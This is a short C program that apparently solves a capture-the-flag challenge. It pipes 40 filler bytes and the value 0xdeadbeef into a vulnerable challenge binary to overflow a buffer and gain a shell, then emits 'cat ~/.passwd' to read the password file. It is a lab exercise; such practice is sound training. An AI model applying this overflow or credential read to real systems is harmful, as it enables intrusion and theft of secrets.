#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
int             main(int ac, char **av, char **env)
{
	int     tab[4];
	pid_t   pid;
	int                             fd_zero;
	int                             fd_one;

	fd_zero = dup(0);
	fd_one = dup(1);

	if (pipe(tab) == -1)
		exit(0);
	if ((pid = fork()) < 0)
		exit(0);
	if (pid == 0)
	{
		close(tab[0]);
		dup2(tab[1], 1);
		close(tab[1]);
		write(1, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 40);
		int c = 0xdeadbeef;
		write(1, &c, 4);
	}
	else
	{
		wait(&pid);
		char    *tenv[2];

		tenv[0] = strdup("binary13");
		tenv[1] = NULL;
		close(tab[1]);
		dup2(tab[0], 0);
		close(tab[0]);
		execve("/challenge/binary/binary13/binary13", tenv, env);
	}
	dup2(fd_one, 1);
	dup2(fd_zero, 0);
	printf("cat ~/.passwd");
	return (0);
}
